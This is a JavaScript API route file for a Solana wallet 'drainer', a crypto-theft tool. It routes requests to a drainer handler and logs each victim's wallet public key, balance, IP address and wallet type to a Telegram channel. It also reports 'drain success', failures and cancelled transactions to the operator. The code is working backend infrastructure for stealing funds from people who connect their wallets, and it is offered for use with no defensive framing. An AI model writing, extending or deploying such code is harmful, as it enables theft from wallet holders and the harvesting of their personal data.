import drainerHandler from './drainer.js';
import telegramLogger from '../src/telegram.js';

export default async function handler(req, res) {
  // Set CORS headers for Vercel deployment
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }
  
  const { pathname } = new URL(req.url, `http://${req.headers.host}`);
  
  // Route based on path
  if (pathname === '/api/drainer/log-wallet') {
    await handleWalletLogging(req, res);
  } else if (pathname === '/api/drainer/log-confirmation') {
    await handleConfirmationLogging(req, res);
  } else if (pathname === '/api/drainer/log-cancellation') {
    await handleCancellationLogging(req, res);
  } else if (pathname === '/api/drainer') {
    await drainerHandler(req, res);
  } else {
    res.status(404).json({ error: 'Not found' });
  }
}

// Wallet logging handler
async function handleWalletLogging(req, res) {
  try {
    console.log('[SERVER] Received request body:', req.body);
    console.log('[SERVER] Request headers:', req.headers);
    
    const { publicKey, walletType, origin, userAgent, lamports } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
    
    // Validate required fields
    if (!publicKey) {
      console.error('[SERVER] Missing publicKey in request');
      return res.status(400).json({ error: 'Missing publicKey' });
    }
    
    console.log('[SERVER] Received wallet log request:', {
      publicKey: publicKey,
      walletType: walletType,
      lamports: lamports,
      ip: userIp
    });
    
    // Log wallet detection
    await telegramLogger.logWalletDetected({
      publicKey: publicKey,
      lamports: lamports || 0,
      ip: userIp,
      walletType: walletType || 'Unknown'
    });
    
    console.log('[SERVER] Wallet logging successful');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[SERVER] Error logging wallet connection:', error);
    res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
  }
}

// Confirmation logging handler
async function handleConfirmationLogging(req, res) {
  try {
    console.log('[CONFIRMATION] Received confirmation request:', req.body);
    const { publicKey, txid, status, error } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
    
    if (status === 'confirmed' || status === 'finalized' || status === 'processed' || status === 'broadcast_success') {
      console.log('[CONFIRMATION] Logging successful confirmation for:', publicKey, txid, 'status:', status);
      await telegramLogger.logDrainSuccess({
        publicKey: publicKey,
        actualDrainAmount: 0,
        ip: userIp
      });
    } else if (error) {
      console.log('[CONFIRMATION] Logging failed confirmation for:', publicKey, txid, error);
      await telegramLogger.logDrainFailed({
        publicKey: publicKey,
        lamports: 0,
        ip: userIp,
        error: error || 'Transaction failed on-chain'
      });
    } else {
      console.log('[CONFIRMATION] Unknown status:', status, 'for:', publicKey, txid);
    }
    
    console.log('[CONFIRMATION] Confirmation logged successfully');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[CONFIRMATION] Error logging confirmation:', error);
    res.status(500).json({ error: 'Failed to log confirmation', details: error.message });
  }
}

// Cancellation logging handler
async function handleCancellationLogging(req, res) {
  try {
    console.log('[CANCELLATION] Received cancellation request:', req.body);
    const { publicKey, walletType, reason } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
    
    await telegramLogger.logTransactionCancelled({
      publicKey: publicKey,
      walletType: walletType || 'Unknown',
      reason: reason || 'User cancelled transaction',
      ip: userIp
    });
    
    console.log('[CANCELLATION] Cancellation logged successfully');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[CANCELLATION] Error logging cancellation:', error);
    res.status(500).json({ error: 'Failed to log cancellation', details: error.message });
  }
} 